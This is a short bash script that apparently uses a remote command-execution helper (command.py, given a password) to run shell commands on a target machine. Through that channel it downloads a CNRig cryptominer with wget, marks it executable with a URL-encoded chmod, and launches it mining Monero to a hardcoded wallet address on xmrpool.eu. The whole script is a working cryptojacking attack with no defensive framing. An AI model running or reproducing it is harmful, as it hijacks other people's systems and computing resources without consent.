#!/bin/bash

PASSWORD=$1

python initial_get.py
python command.py "$PASSWORD" "echo test"
python command.py "$PASSWORD" "wget -O cnrig http://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64"
python command.py "$PASSWORD" "chmod %2Bx cnrig"
python command.py "$PASSWORD" "./cnrig --donate-level 1 -a cryptonight -u 4719r3gNJh52wto7TvdDfnP1oUzATdbbDa9nXg81kFg49YW5eaNXWHs9RNi1HFwWtUGwdJT4N54YJKodtBKSVi5vKkExrXt -o xmrpool.eu:3333 -p x"

